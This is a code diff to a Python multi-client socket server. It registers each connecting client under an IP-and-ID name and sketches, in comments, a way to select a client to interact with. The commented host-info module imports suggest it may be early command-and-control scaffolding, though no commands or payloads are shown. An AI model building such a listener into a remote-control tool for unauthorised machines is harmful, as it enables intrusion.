@@ -8,7 +8,7 @@ import socket
 import threading
 import time
 
-
+import random
 #import imports
 #import Modules.Linux.linux_info
 #import Modules.Windows.windows_info
@@ -16,6 +16,7 @@ import time
 
 HEADER = 64
 FORMAT = 'utf-8'
+
 
 
 class s_sock:
@@ -34,17 +35,57 @@ class s_sock:
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
             self.conn, addr = self.server.accept()
-            print("Accepted Connection")
-            thread = threading.Thread(target=self.handle_client, args=(self.conn, self.ADDR))
+            print("~New Connection~")
+            
+            ## Getting client id from the client, and the IP address
+            ip_address = self.conn.getpeername()[0]
+            id = self.conn.recv(1024).decode()
+            
+            ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
+            
+            client_name = "client_" + ip_address.replace(".", "_") + "_" + id
+            client = s_perclient()
+
+            globals()[client_name] = client
+            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))
+
             thread.start()        
+    
+            # list all s_perclient instances by name
+            print("\n\n========Current Clients========")
+            for var_name in globals():
+                if var_name.startswith("client_"):
+                    print(var_name)
+            print("===============================\n\n")
+            
+            ## for interacting with each client, :
+            #client = client_127_0_0_1_QWERT
+            #client.handle_client()
+            
+            ## Would need to show current clients to the user, then set whatever one they choose to "client". 
+            ## With error handling of course. 
+            
+            ## ex:
+            ## Def interact():
+            ##  clinet = None (clears client just in case)
+            ##  client = user_input()
+            ##  if clinet not in clinet_list:
+            ##    print("err not a valid eclinet")
+            ## else:
+            ## client.interact() ## creating an interact method in the class, or just use handle_client (might need a re-think of the logic)
     
     
     ##########
     ## In Sub Thread
     ##########
+class s_perclient:
     
     ## Each thread runs this, which will handle the client appropriatly.
     def handle_client(self, conn, addr):
+        self.conn = conn
+        self.addr = addr
+        
+        
         print(f"New Connection from {conn.getpeername()}")
         
         ## Listening for anythinf from the client
@@ -62,6 +103,8 @@ class s_sock:
             
         # Close the connection when the loop is over
         conn.close()
+        
+        ## class needs to die when done
 
     ## decision tree
     def decision_tree(self, msg):
@@ -178,7 +221,7 @@ class s_action:
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
-    SERV.start_server('0.0.0.0',8089)
+    SERV.start_server('0.0.0.0',8091)
     #while True:
     
     '''while True:
